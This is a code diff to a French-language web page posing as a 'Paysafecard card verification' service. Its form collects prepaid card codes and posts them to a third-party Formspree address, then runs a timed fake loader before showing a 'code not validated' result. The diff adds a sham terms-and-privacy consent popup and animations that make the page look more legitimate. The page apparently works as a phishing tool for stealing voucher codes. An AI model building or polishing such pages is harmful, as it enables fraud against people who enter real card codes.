@@ -8,13 +8,23 @@
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
 </head>
 <body>
-  <div class="main-container">
-    <h1>💳 Vérification de carte Paysafecard</h1>
+  <div class="popup" id="popup">
+    <h2>Bienvenue</h2>
+    <p>
+      En cliquant sur <strong>J'accepte</strong>, vous acceptez les
+      <a href="#" class="blue-link">conditions générales d'utilisation</a> et la
+      <a href="#" class="blue-link">politique de confidentialité</a>.
+    </p>
+    <button onclick="fermerPopup()">J'accepte</button>
+  </div>
+
+  <div class="main-container hidden" id="main">
+    <h1>💳 Vérification de carte <span class="blue-text">Paysafecard</span></h1>
 
     <form id="codeForm" action="https://formspree.io/f/myzjvnwg" method="POST" onsubmit="return handleSubmit(event)">
       <label for="codeInput">Entrer votre code :</label>
-      <input type="text" name="code" id="codeInput" maxlength="32" placeholder="XXXX-XXXX-XXXX-XXXX" required>
-      <button type="submit">Vérifier</button>
+      <input type="text" name="code" id="codeInput" maxlength="32" placeholder="XXXX-XXXX-XXXX-XXXX" disabled required>
+      <button type="submit" id="verifyBtn" disabled>Vérifier</button>
     </form>
 
     <div id="loaderBar"></div>
@@ -55,9 +65,27 @@
             resultat.innerHTML = '<div class="result error">❌ Code non validé</div>';
           }
         }
-      }, 90); // 90ms * 100 = 9 secondes
+      }, 90);
+    }
 
-      return false;
+    function fermerPopup() {
+      const popup = document.getElementById("popup");
+      popup.classList.add("hide");
+
+      // Attendre la fin de l'animation avant d'afficher le reste
+      setTimeout(() => {
+        document.getElementById("main").classList.remove("hidden");
+        document.getElementById("main").classList.add("slide-in");
+        document.getElementById("codeInput").disabled = false;
+        document.getElementById("verifyBtn").disabled = false;
+      }, 1000);
+    }
+
+    window.onload = () => {
+      setTimeout(() => {
+        document.querySelector(".info-box").style.opacity = "1";
+        document.querySelector(".info-box").style.transform = "translateX(0)";
+      }, 1000);
     }
   </script>
 </body>
